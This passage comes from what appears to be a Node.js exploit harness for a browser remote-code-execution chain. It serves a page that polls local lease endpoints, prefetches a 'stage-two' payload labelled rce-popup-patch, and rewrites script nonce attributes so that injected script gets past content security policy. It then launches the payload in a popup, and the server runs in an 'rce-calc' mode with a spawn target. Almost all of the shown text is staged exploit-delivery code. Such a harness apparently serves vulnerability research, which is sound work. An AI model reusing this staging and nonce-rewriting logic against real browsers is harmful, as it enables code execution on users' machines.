payload invariant failed bytes=" + fetchedPayload.length);\n    }\n    if (!currentLease || currentLease.token !== lease.token) return false;\n    let nonceRewrites = 0;\n    const payload = activityNonce\n      ? fetchedPayload.replace(\n          /(<script\\b[^>]*\\bnonce\\s*=\\s*)(["'])[^"']*\\2/gi,\n          (match, prefix, quote) => {\n            nonceRewrites++;\n            return prefix + quote + activityNonce + quote;\n          },\n        )\n      : fetchedPayload;\n    stageTwoPayload = payload;\n    runButton.disabled = false;\n    emit(\n      "stage-two-prefetched bytes=" + payload.length +\n        " activityNonce=" + !!activityNonce +\n        " nonceRewrites=" + nonceRewrites,\n    );\n    return true;\n  }\n\n  async function poll() {\n    if (busy) return;\n    busy = true;\n    try {\n      await fetch(\n        "/protocol/register?instance=" + encodeURIComponent(instance) +\n          "&generation=" + encodeURIComponent(protocolGeneration),\n        {cache:"no-store"},\n      );\n      const lease = await fetch(\n        "/protocol/lease?instance=" + encodeURIComponent(instance) +\n          "&generation=" + encodeURIComponent(protocolGeneration),\n        {cache:"no-store"},\n      )\n        .then((response) => response.json());\n      if (lease.dispatched || lease.status === "dispatched") {\n        runButton.disabled = true;\n        emit("complete: stage-one browser dispatch observed");\n        return;\n      }\n      if (lease.status === "granted") {\n        if (!currentLease || currentLease.token !== lease.token) {\n          currentLease = lease;\n          currentPayload =\n            "/payload?stage=rce-popup-patch&instance=" + encodeURIComponent(instance) +\n              "&token=" + encodeURIComponent(lease.token) +\n              "&origin=" + encodeURIComponent(location.origin);\n          emit("lease-granted attempt=" + lease.attempt + " stageTwoOrigin=" + (payloadOrigin || "missing"));\n          const stageTwoReady = await prepareStageTwo(lease);\n          if (stageTwoReady && ${JSON.stringify(!1)}) {\n            setTimeout(() => launch("auto"), 100);\n          }\n        } else if (!stageTwoPayload) {\n          try { await prepareStageTwo(lease); }\n          catch (error) { emit("stage-two-prefetch-failed " + ((error && error.message) || error)); }\n        } else if (!launching && (!activePopup || activePopup.closed)) {\n          runButton.disabled = false;\n        }\n      } else {\n        runButton.disabled = true;\n        emit("state=" + lease.status + " active=" + lease.activeInstances + "/" + lease.requiredInstances + " attempted=" + lease.attemptedInstances);\n      }\n    } catch (error) {\n      runButton.disabled = true;\n      emit("poll-error " + ((error && error.message) || error));\n    } finally {\n      busy = false;\n    }\n  }\n\n  emit("loaded instance=" + instance + " origin=" + location.origin + " mainOrigin=" + (mainOrigin || "unresolved"));\n  setInterval(poll, 1000);\n  poll();\n})();\n<\/script>`, "text/html; charset=utf-8", !0) : send(res, 404, "not found\n");
    } catch (error) {
        return append(`ERROR ${error.stack || error}`), send(res, 500, `${error.message}\n`);
    }
});

server.listen(PORT, "127.0.0.1", () => fs.existsSync(RCE_SPAWN_PATH) ? rceRecoveryReady() ? (append(`FATAL recovery flag already exists: ${RCE_RECOVERY_FLAG}`),
void server.close(() => process.exit(2))) : (append(`RCE_CONFIG spawn=${RCE_SPAWN_PATH} recoveryFlag=${RCE_RECOVERY_FLAG}`),
append(`LISTEN http://127.0.0.1:${PORT}/ mode=rce-calc candidate=${currentCandidate()} payloadOrigin=${rcePayloadOrigin || "unset"}`),
void append(`LOG ${logPath}`)) : (append(`FATAL spawn target is missing: ${RCE_SPAWN_PATH}`),
void server.close(() => process.exit(2))));